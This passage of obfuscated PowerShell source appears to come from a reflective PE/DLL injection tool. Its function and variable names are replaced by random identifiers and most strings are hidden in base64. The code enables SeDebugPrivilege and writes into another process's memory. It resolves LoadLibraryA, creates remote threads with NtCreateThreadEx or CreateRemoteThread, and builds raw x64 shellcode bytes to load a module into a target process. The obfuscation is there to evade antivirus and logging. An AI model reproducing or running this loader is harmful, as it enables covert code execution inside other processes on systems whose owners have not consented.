	    ${2dc47f5638504d62bdd339701bb512c1} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${fdbfd1638c4944af877d03a4a655abc8} = ${e21330ab334d4b779edeb53d24bb8eef}.DefineDynamicAssembly(${2dc47f5638504d62bdd339701bb512c1}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${fe58a05b9eeb4744b1b654a407ed5d8e} = ${fdbfd1638c4944af877d03a4a655abc8}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${cdcf07b8d26f41a29bf9d523dffbafa0} = ${fe58a05b9eeb4744b1b654a407ed5d8e}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${b816a660b3944a70a967c6c7034b5570} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${a7107a3b6abb473a8953fbe18f6cb377})
	    ${b816a660b3944a70a967c6c7034b5570}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${587c9196f45e43cfbd988986ef90bdbf} = ${cdcf07b8d26f41a29bf9d523dffbafa0}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${b16e39a06cd94d89ad5bc734e1f76966}, ${a7107a3b6abb473a8953fbe18f6cb377})
	    ${587c9196f45e43cfbd988986ef90bdbf}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${cdcf07b8d26f41a29bf9d523dffbafa0}.CreateType()
	}
	Function b18d8aa7bc714d5fa74846d987300d0f
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${c44ca0d56f1c47df92f1536557def28e},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${de374252bab0446aafc749030d21bb17}
	    )
	    ${891e88a3e9a84aa4a9c7624b531e381e} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${2e8d76a5ecc14957a5091f23677e9ec4} = ${891e88a3e9a84aa4a9c7624b531e381e}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${3139fa00b9c94d37b35d66d69a0266d3} = ${2e8d76a5ecc14957a5091f23677e9ec4}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${8b2e8cad9d0e4b74b486eafa4b413b71} = ${2e8d76a5ecc14957a5091f23677e9ec4}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))), [reflection.bindingflags] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA='))), $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    ${fbf3940602474bdaaac4b38d29eb8dad} = ${3139fa00b9c94d37b35d66d69a0266d3}.Invoke($null, @(${c44ca0d56f1c47df92f1536557def28e}))
	    ${9b6ac3ff7ab3454a88fe7f0cdb68558d} = New-Object IntPtr
	    ${455b7c7b1d2845369b3734730372b4a2} = New-Object System.Runtime.InteropServices.HandleRef(${9b6ac3ff7ab3454a88fe7f0cdb68558d}, ${fbf3940602474bdaaac4b38d29eb8dad})
	    echo ${8b2e8cad9d0e4b74b486eafa4b413b71}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${455b7c7b1d2845369b3734730372b4a2}, ${de374252bab0446aafc749030d21bb17}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[IntPtr]${cc424a5bc22149068bb673c07a478fd5} = $Win32Functions.GetCurrentThread.Invoke()
		if (${cc424a5bc22149068bb673c07a478fd5} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]${5a6ed633f5464d69993a6a65899014e2} = [IntPtr]::Zero
		[Bool]${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.OpenThreadToken.Invoke(${cc424a5bc22149068bb673c07a478fd5}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${5a6ed633f5464d69993a6a65899014e2})
		if (${8e08ff89ff934c1fbfa999be923764fb} -eq $false)
		{
			${134173af58a1428d9752c31800b8eb31} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${134173af58a1428d9752c31800b8eb31} -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.ImpersonateSelf.Invoke(3)
				if (${8e08ff89ff934c1fbfa999be923764fb} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.OpenThreadToken.Invoke(${cc424a5bc22149068bb673c07a478fd5}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${5a6ed633f5464d69993a6a65899014e2})
				if (${8e08ff89ff934c1fbfa999be923764fb} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7ADEAMwA0ADEANwAzAGEAZgA1ADgAYQAxADQAMgA4AGQAOQA3ADUAMgBjADMAMQA4ADAAMABiADgAZQBiADMAMQB9AA==')))
			}
		}
		[IntPtr]${825241b07d1044a5abc278a7327a8cec} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), ${825241b07d1044a5abc278a7327a8cec})
		if (${8e08ff89ff934c1fbfa999be923764fb} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]${cdccd0f4090641f5842055bbf95147be} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]${a57b8bd82f5b4e71b23760924a883c88} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${cdccd0f4090641f5842055bbf95147be})
		${eb39f978496549b28e1d51f1d6383d90} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${a57b8bd82f5b4e71b23760924a883c88}, [Type]$Win32Types.TOKEN_PRIVILEGES)
		${eb39f978496549b28e1d51f1d6383d90}.PrivilegeCount = 1
		${eb39f978496549b28e1d51f1d6383d90}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${825241b07d1044a5abc278a7327a8cec}, [Type]$Win32Types.LUID)
		${eb39f978496549b28e1d51f1d6383d90}.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${eb39f978496549b28e1d51f1d6383d90}, ${a57b8bd82f5b4e71b23760924a883c88}, $true)
		${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.AdjustTokenPrivileges.Invoke(${5a6ed633f5464d69993a6a65899014e2}, $false, ${a57b8bd82f5b4e71b23760924a883c88}, ${cdccd0f4090641f5842055bbf95147be}, [IntPtr]::Zero, [IntPtr]::Zero)
		${134173af58a1428d9752c31800b8eb31} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${8e08ff89ff934c1fbfa999be923764fb} -eq $false) -or (${134173af58a1428d9752c31800b8eb31} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${a57b8bd82f5b4e71b23760924a883c88})
	}
	Function ef987d4149fa413e954cb531fe969a83
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${de6617bbc6024f2b859287e674e79d55},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${e8467a7c0eca496ebed04014d585d83a},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${d1405e3afc3e4e01af7af611dcf0f07c} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		[IntPtr]${fa858822ca754cc3afe6ef4e44b3db35} = [IntPtr]::Zero
		${9611803b94a54b70b1a888c3530f47fb} = [Environment]::OSVersion.Version
		if ((${9611803b94a54b70b1a888c3530f47fb} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${9611803b94a54b70b1a888c3530f47fb} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
		{
			${4f8e3109a450415da756470963a269e9}= $Win32Functions.NtCreateThreadEx.Invoke([Ref]${fa858822ca754cc3afe6ef4e44b3db35}, 0x1FFFFF, [IntPtr]::Zero, ${de6617bbc6024f2b859287e674e79d55}, ${e8467a7c0eca496ebed04014d585d83a}, ${d1405e3afc3e4e01af7af611dcf0f07c}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${bdb0431039714ceb9f14c98489f3de01} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${fa858822ca754cc3afe6ef4e44b3db35} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAATgB0AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAEUAeAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewA0AGYAOABlADMAMQAwADkAYQA0ADUAMAA0ADEANQBkAGEANwA1ADYANAA3ADAAOQA2ADMAYQAyADYAOQBlADkAfQAuACAATABhAHMAdABFAHIAcgBvAHIAOgAgACQAewBiAGQAYgAwADQAMwAxADAAMwA5ADcAMQA0AGMAZQBiADkAZgAxADQAYwA5ADgANAA4ADkAZgAzAGQAZQAwADEAfQA=')))
			}
		}
		else
		{
			${fa858822ca754cc3afe6ef4e44b3db35} = $Win32Functions.CreateRemoteThread.Invoke(${de6617bbc6024f2b859287e674e79d55}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${e8467a7c0eca496ebed04014d585d83a}, ${d1405e3afc3e4e01af7af611dcf0f07c}, 0, [IntPtr]::Zero)
		}
		if (${fa858822ca754cc3afe6ef4e44b3db35} -eq [IntPtr]::Zero)
		{
			Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA'))) -ErrorAction Stop
		}
		return ${fa858822ca754cc3afe6ef4e44b3db35}
	}
	Function d563932acca249cc9330aacbad1044ff
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${d9510966a3a443f1926a3ce72ac5937f},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${d8e5f632106f440e9d561bc4ecf40ebd} = New-Object System.Object
		${cd226cec4c55404e8243cbfe3a107ee0} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${d9510966a3a443f1926a3ce72ac5937f}, [Type]$Win32Types.IMAGE_DOS_HEADER)
		[IntPtr]${150b372436bb4f6380f391f947a27c1e} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${d9510966a3a443f1926a3ce72ac5937f}) ([Int64][UInt64]${cd226cec4c55404e8243cbfe3a107ee0}.e_lfanew))
		${d8e5f632106f440e9d561bc4ecf40ebd} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${150b372436bb4f6380f391f947a27c1e}
		${d4ae5f2e998b4bacab49e29b9eaa88ef} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${150b372436bb4f6380f391f947a27c1e}, [Type]$Win32Types.IMAGE_NT_HEADERS64)
	    if (${d4ae5f2e998b4bacab49e29b9eaa88ef}.Signature -ne 0x00004550)
	    {
	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${d4ae5f2e998b4bacab49e29b9eaa88ef}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${d8e5f632106f440e9d561bc4ecf40ebd} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${d4ae5f2e998b4bacab49e29b9eaa88ef}
			${d8e5f632106f440e9d561bc4ecf40ebd} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${8de3a57f65954ea7bab8207247d30db4} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${150b372436bb4f6380f391f947a27c1e}, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			${d8e5f632106f440e9d561bc4ecf40ebd} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${8de3a57f65954ea7bab8207247d30db4}
			${d8e5f632106f440e9d561bc4ecf40ebd} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${d8e5f632106f440e9d561bc4ecf40ebd}
	}
	Function a3030bd3659543dfa92317be2d7abf31
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${c8e0d86ea0e74817acb552fc5014588b},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${b5905e299da14ea186abe1140fee1a54} = New-Object System.Object
		[IntPtr]${a815a6578a024acba11ff6420ff8438d} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${c8e0d86ea0e74817acb552fc5014588b}.Length)
		[System.Runtime.InteropServices.Marshal]::Copy(${c8e0d86ea0e74817acb552fc5014588b}, 0, ${a815a6578a024acba11ff6420ff8438d}, ${c8e0d86ea0e74817acb552fc5014588b}.Length) | Out-Null
		${d8e5f632106f440e9d561bc4ecf40ebd} = d563932acca249cc9330aacbad1044ff -d9510966a3a443f1926a3ce72ac5937f ${a815a6578a024acba11ff6420ff8438d} -Win32Types $Win32Types
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${d8e5f632106f440e9d561bc4ecf40ebd}.PE64Bit)
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${d8e5f632106f440e9d561bc4ecf40ebd}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${d8e5f632106f440e9d561bc4ecf40ebd}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${d8e5f632106f440e9d561bc4ecf40ebd}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${d8e5f632106f440e9d561bc4ecf40ebd}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${a815a6578a024acba11ff6420ff8438d})
		return ${b5905e299da14ea186abe1140fee1a54}
	}
	Function a4058eb6b7e24f7f8d162c0ac15a5e95
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${d9510966a3a443f1926a3ce72ac5937f},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		if (${d9510966a3a443f1926a3ce72ac5937f} -eq $null -or ${d9510966a3a443f1926a3ce72ac5937f} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${b5905e299da14ea186abe1140fee1a54} = New-Object System.Object
		${d8e5f632106f440e9d561bc4ecf40ebd} = d563932acca249cc9330aacbad1044ff -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f} -Win32Types $Win32Types
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${d9510966a3a443f1926a3ce72ac5937f}
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${d8e5f632106f440e9d561bc4ecf40ebd}.IMAGE_NT_HEADERS)
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${d8e5f632106f440e9d561bc4ecf40ebd}.NtHeadersPtr)
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${d8e5f632106f440e9d561bc4ecf40ebd}.PE64Bit)
		${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${d8e5f632106f440e9d561bc4ecf40ebd}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${b5905e299da14ea186abe1140fee1a54}.PE64Bit -eq $true)
		{
			[IntPtr]${eabe84ac112549f3851692ee08783edf} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${eabe84ac112549f3851692ee08783edf}
		}
		else
		{
			[IntPtr]${eabe84ac112549f3851692ee08783edf} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${eabe84ac112549f3851692ee08783edf}
		}
		if ((${d8e5f632106f440e9d561bc4ecf40ebd}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${d8e5f632106f440e9d561bc4ecf40ebd}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${b5905e299da14ea186abe1140fee1a54} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${b5905e299da14ea186abe1140fee1a54}
	}
	Function a54167c4509b4d4891d32a979159bc6a
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${b8098c5a8297473498a6b72001bbfcf1},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${c965d0379fb645cdafef727b6ddef3af}
		)
		${3ff8b22ecd6e4e91a20a6c4bd8305519} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${b4c857b2e0d54ecf927e9431bcc43457} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${c965d0379fb645cdafef727b6ddef3af})
		${fd5d411468e44a98893a45387727f10e} = [UIntPtr][UInt64]([UInt64]${b4c857b2e0d54ecf927e9431bcc43457}.Length + 1)
		${11d3c51aa0a647699eb3fbf8ae4d6e0c} = $Win32Functions.VirtualAllocEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, [IntPtr]::Zero, ${fd5d411468e44a98893a45387727f10e}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${11d3c51aa0a647699eb3fbf8ae4d6e0c} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${ebaa2d792332466cb1cf1a277e96e1b3} = [UIntPtr]::Zero
		${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.WriteProcessMemory.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${11d3c51aa0a647699eb3fbf8ae4d6e0c}, ${c965d0379fb645cdafef727b6ddef3af}, ${fd5d411468e44a98893a45387727f10e}, [Ref]${ebaa2d792332466cb1cf1a277e96e1b3})
		if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${fd5d411468e44a98893a45387727f10e} -ne ${ebaa2d792332466cb1cf1a277e96e1b3})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${e04853482a0844609e341ee78518fdf4} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${69dbee7f4a0d4729be43a2fd77403ae0} = $Win32Functions.GetProcAddress.Invoke(${e04853482a0844609e341ee78518fdf4}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]${70b16b0363e34f158e8bc36f60ca05b6} = [IntPtr]::Zero
		if (${b5905e299da14ea186abe1140fee1a54}.PE64Bit -eq $true)
		{
			${03acbdbf363740749483799da2078d89} = $Win32Functions.VirtualAllocEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, [IntPtr]::Zero, ${fd5d411468e44a98893a45387727f10e}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if (${03acbdbf363740749483799da2078d89} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${c4f807f864764303a3ad397e56ddef65} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${1b52eca41c6642cc8fe2a376fb4aaa59} = @(0x48, 0xba)
			${b39b78ec90f34b74958eedeba9e058ee} = @(0xff, 0xd2, 0x48, 0xba)
			${84507904eccf4701bbdb095157e38476} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${8910ffb6f9af4222aaa37c26fd3c4509} = ${c4f807f864764303a3ad397e56ddef65}.Length + ${1b52eca41c6642cc8fe2a376fb4aaa59}.Length + ${b39b78ec90f34b74958eedeba9e058ee}.Length + ${84507904eccf4701bbdb095157e38476}.Length + (${3ff8b22ecd6e4e91a20a6c4bd8305519} * 3)
			${3b1ba4c013b1469784f85eaa004a0cb7} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${8910ffb6f9af4222aaa37c26fd3c4509})
			${07df5eb296244663a059021557847f1e} = ${3b1ba4c013b1469784f85eaa004a0cb7}
			d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${c4f807f864764303a3ad397e56ddef65} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
